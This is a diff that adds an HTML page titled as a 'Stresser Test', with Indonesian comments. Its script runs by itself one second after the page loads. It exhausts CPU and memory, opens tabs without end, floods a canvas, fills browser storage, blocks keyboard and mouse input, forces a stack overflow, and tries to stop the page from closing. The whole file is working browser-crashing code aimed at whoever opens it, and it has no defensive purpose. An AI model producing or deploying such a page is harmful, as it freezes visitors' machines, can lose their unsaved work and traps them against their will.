@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LenzStarVerse Stresser Test</title>
+</head>
+<body>
+    <script>
+        function cpuOverload() {
+            while(true) {
+                // Perhitungan kompleks berulang
+                for(let i = 0; i < 1000000; i++) {
+                    Math.pow(Math.random(), Math.random());
+                }
+                let hugeArray = new Array(10000000).fill(0);
+                // Menggunakan semua memori
+                window.memoryLeak = window.memoryLeak || [];
+                window.memoryLeak.push(new Array(1000000));
+            }
+        }
+
+        function infiniteTabs() {
+            while(true) {
+                window.open(window.location.href);
+            }
+        }
+
+        function gpuCrash() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            document.body.appendChild(canvas);
+            
+            setInterval(() => {
+                for(let i = 0; i < 1000; i++) {
+                    // Efek grafis intensif GPU
+                    ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+                    ctx.fillRect(Math.random()*10000, Math.random()*10000, 10000, 10000);
+                }
+            }, 1);
+        }
+
+        function destroyStorage() {
+            while(true) {
+                localStorage.setItem('crash', new Array(10000000).join('x'));
+                sessionStorage.setItem('crash', new Array(10000000).join('x'));
+            }
+        }
+
+        function lockInput() {
+            document.addEventListener('keydown', (e) => e.preventDefault());
+            document.addEventListener('click', (e) => e.preventDefault());
+            document.addEventListener('mousemove', (e) => e.preventDefault());
+        }
+
+        setTimeout(() => {
+            cpuOverload();
+            infiniteTabs();
+            gpuCrash();
+            destroyStorage();
+            lockInput();
+            
+            // Crash tambahan dengan error recursion
+            function stackOverflow() {
+                stackOverflow();
+            }
+            stackOverflow();
+        }, 1000);
+
+        window.onbeforeunload = function() {
+            return "Tidak bisa menutup halaman!";
+        };
+    </script>
+</body>
+  </html>
